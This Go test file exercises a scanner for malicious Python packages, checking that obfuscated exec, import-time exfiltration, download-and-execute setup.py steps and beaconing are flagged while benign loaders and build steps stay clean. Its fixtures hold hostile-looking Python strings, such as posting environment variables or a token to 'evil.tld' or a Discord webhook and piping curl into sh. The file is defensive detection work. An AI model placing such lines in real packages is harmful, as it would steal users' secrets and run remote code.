package pysource

import "testing"

// TestScan_ObfuscatedExecKind verifies the bare-vs-coupled split on the
// obfuscated decode-and-exec signal (detection-roadmap item 3). Bare
// obfuscated exec (no send/recon/harvest/exfil co-marker in the same file)
// still FIRES for visibility but is tagged with the advisory kind so the
// scoring layer can apply a lighter penalty; a legit plugin/bytecode loader
// must not be driven below the block line by it alone. When the obfuscated
// exec co-occurs with an exfil/send/recon marker — a real dropper — the
// strong "obfuscated_exec" kind is emitted.
func TestScan_ObfuscatedExecKind(t *testing.T) {
	cases := []struct {
		name     string
		files    map[string]string
		wantKind string
	}{
		{
			name: "bare obfuscated exec (legit plugin loader shape) -> advisory kind",
			files: map[string]string{
				// A plugin/bytecode loader: decodes a packaged blob and execs it,
				// but does NOT send, harvest env, or recon the host.
				"pkg/loader.py": "import base64\nexec(base64.b64decode(_PLUGIN_BLOB))\n",
			},
			wantKind: "obfuscated_exec_bare",
		},
		{
			name: "obfuscated exec + network send (dropper) -> strong kind",
			files: map[string]string{
				"pkg/__init__.py": "import base64, requests\nrequests.post('https://evil.tld/c2', data=b'x')\nexec(base64.b64decode('cHJpbnQoMSk='))\n",
			},
			wantKind: "obfuscated_exec",
		},
		{
			name: "obfuscated exec + env harvest -> strong kind",
			files: map[string]string{
				"pkg/__init__.py": "import base64, os\nT = os.getenv('TOKEN')\nexec(base64.b64decode('eA=='))\n",
			},
			wantKind: "obfuscated_exec",
		},
		{
			name: "obfuscated exec + recon -> strong kind",
			files: map[string]string{
				"pkg/__init__.py": "import base64, platform\nH = platform.node()\nexec(base64.b64decode('eA=='))\n",
			},
			wantKind: "obfuscated_exec",
		},
		{
			name: "obfuscated exec + exfil-host reference -> strong kind",
			files: map[string]string{
				"pkg/__init__.py": "import base64\nURL = 'https://discord.com/api/webhooks/1/abc'\nexec(base64.b64decode('eA=='))\n",
			},
			wantKind: "obfuscated_exec",
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			r := Scan(files(c.files))
			if !r.Detected {
				t.Fatalf("expected detection, got none")
			}
			if r.Kind != c.wantKind {
				t.Errorf("kind = %q, want %q (detail %s)", r.Kind, c.wantKind, r.Detail)
			}
		})
	}
}

func files(m map[string]string) map[string][]byte {
	out := make(map[string][]byte, len(m))
	for k, v := range m {
		out[k] = []byte(v)
	}
	return out
}

func TestScan_Malicious(t *testing.T) {
	cases := map[string]map[string]string{
		"top-level obfuscated exec": {
			"pkg/__init__.py": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n",
		},
		"nested obfuscated exec still fires (dispositive)": {
			"pkg/util.py": "def boot():\n    eval(compile(__import__('base64').b64decode(x), '<s>', 'exec'))\n",
		},
		"marshal loads exec": {
			"pkg/m.py": "import marshal\nexec(marshal.loads(b'...'))\n",
		},
		"hex decode exec": {
			"pkg/h.py": "exec(bytes.fromhex('7072696e7428312900'))\n",
		},
		"import-time exfil coupling (init)": {
			"pkg/__init__.py": "import os, requests\nrequests.post('https://evil.tld/c2', json={'e': dict(os.environ)})\n",
		},
		"discord webhook exfil": {
			"pkg/__init__.py": "import os\nimport urllib.request\nurllib.request.urlopen('https://discord.com/api/webhooks/123', os.getenv('TOKEN').encode())\n",
		},
		"top-level shell in setup.py": {
			"setup.py": "import os\nos.system('curl http://evil.tld/x | sh')\nfrom setuptools import setup\nsetup(name='x')\n",
		},
		// Regression (review gap): import-time exfil via httpx (a modern HTTP
		// client the send regex previously missed) must fire.
		"import-time exfil via httpx": {
			"pkg/__init__.py": "import os, httpx\nhttpx.post('https://evil.tld/c2', json=dict(os.environ))\n",
		},
		// Regression: bash -c inline-code execution is a download-exec shape.
		"top-level bash -c stays caught": {
			"pkg/__init__.py": "import subprocess\nsubprocess.run(['bash','-c','curl http://evil|sh'])\n",
		},
		// Dependency-confusion beacon: a module-scope call runs a function that
		// phones home host+platform+cwd+CI on import. The send+recon live inside
		// the called function, so the plain top-level coupling misses them.
		"import-time dep-confusion beacon": {
			"pkg/__init__.py": "import os, platform, json, urllib.request\ndef _report():\n    d = json.dumps({'h': platform.node(), 'p': platform.platform(), 'cwd': os.getcwd(), 'ci': os.environ.get('GITHUB_ACTIONS')}).encode()\n    urllib.request.urlopen(urllib.request.Request('https://evil.tld/dc', data=d))\n_report()\n",
		},
		// Embedded-executable dropper: setup.py writes a bundled PE to disk.
		"embedded PE executable dropper": {
			"setup.py": "import os\nf = open(os.getenv('TEMP','/tmp') + '/x.exe', 'wb')\nf.write(b'MZ\\x90\\x00\\x03\\x00\\x00\\x00')\n",
		},
	}
	for name, fs := range cases {
		if r := Scan(files(fs)); !r.Detected {
			t.Errorf("%s: expected detection, got none", name)
		}
	}
}

func TestScan_LegitStaysClean(t *testing.T) {
	cases := map[string]map[string]string{
		"library defines functions (no import-time exec)": {
			"pkg/client.py": "import requests, os, subprocess\n\ndef fetch(u):\n    return requests.get(u)\n\ndef run(cmd):\n    return subprocess.run(cmd)\n\nclass C:\n    def go(self):\n        return os.system('ls')\n",
		},
		"top-level env read for config (no network)": {
			"pkg/settings.py": "import os\nDEBUG = os.environ.get('DEBUG', '0') == '1'\nNAME = os.getenv('APP_NAME', 'app')\n",
		},
		"benign setup.py metadata": {
			"setup.py": "from setuptools import setup\nsetup(name='x', version='1.0', install_requires=['requests'])\n",
		},
		"setup.py publish helper under __main__ guard": {
			"setup.py": "import os\nfrom setuptools import setup\nsetup(name='x')\nif __name__ == '__main__':\n    os.system('twine upload dist/*')\n",
		},
		"re-export __init__": {
			"pkg/__init__.py": "from .client import fetch\nfrom .util import run\n__all__ = ['fetch', 'run']\n",
		},
		"plain exec of a literal (no decode)": {
			"pkg/x.py": "exec('x = 1')\n",
		},
		"top-level network without harvest (rare but benign)": {
			"pkg/ping.py": "import requests\nrequests.get('https://example.com/health')\n",
		},
		// Regression (corpus FP): a benign top-level build step. os.system at
		// import time, but the command is a compiler/build, not a download-exec.
		"top-level benign build shell stays clean": {
			"setup.py": "import os\nos.system('make -C native all')\nfrom setuptools import setup\nsetup(name='x')\n",
		},
		// Regression (review FP): legit native-build setup.py shells out to FETCH
		// a build dep / clone a submodule over https. A bare URL / pip / git in a
		// subprocess is a fetch, not a download-AND-execute — must stay clean.
		"setup.py pip-install over https stays clean": {
			"setup.py": "import subprocess\nsubprocess.run(['pip','install','https://files.pythonhosted.org/x.whl'])\nfrom setuptools import setup\nsetup(name='x')\n",
		},
		"setup.py git clone over https stays clean": {
			"setup.py": "import subprocess\nsubprocess.check_call(['git','clone','https://example.com/x/y'])\n",
		},
		// Beacon FP guards: recon WITHOUT a send (hostname for logging), and a
		// send WITHOUT recon (a config fetch) must both stay clean.
		"recon for logging without send stays clean": {
			"pkg/__init__.py": "import socket, platform\nHOST = socket.gethostname()\nPLATFORM = platform.platform()\n",
		},
		"top-level config fetch without recon stays clean": {
			"pkg/__init__.py": "import requests\ndef _cfg():\n    return requests.get('https://api.example.com/config')\n_cfg()\n",
		},
		// Regression (corpus FP: urllib3): an HTTP library reads env at module
		// top level (proxy/SSL config) and references http.client/socket, but
		// makes NO actual outbound call at import — must stay clean.
		"http library top-level env + references, no import-time send": {
			"pkg/__init__.py": "import os, http.client, socket\nDEFAULT_PROXY = os.environ.get('HTTPS_PROXY')\nDEFAULT_TIMEOUT = os.getenv('TIMEOUT', '30')\n_CONN = http.client.HTTPSConnection\n",
		},
	}
	for name, fs := range cases {
		if r := Scan(files(fs)); r.Detected {
			t.Errorf("%s: expected clean, got %s on %s", name, r.Kind, r.Detail)
		}
	}
}
